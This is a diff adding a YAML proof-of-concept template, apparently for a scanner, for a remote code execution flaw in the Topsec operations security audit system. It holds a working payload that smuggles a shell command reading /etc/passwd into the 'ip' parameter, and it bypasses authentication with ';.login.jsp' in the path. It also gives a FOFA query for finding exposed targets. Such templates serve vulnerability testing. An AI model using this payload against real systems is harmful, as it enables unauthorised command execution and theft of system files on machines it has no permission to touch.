@@ -1,0 +1,18 @@
+id: poc-yaml-topsec-topsag-synrequest-rce
+info:
+  name: 天融信运维安全审计系统 synRequest 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 天融信运维安全审计系统
+  fofa: header="iam" && server="Apache-Coyote/"
+requests:
+- method: POST
+  path: /iam/synRequest.do;.login.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: method=trace_route&w=1&ip=127.0.0.1|echo%20`cat /etc/passwd`%3b&m=10
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<html")
+variables: {}
+transport: http
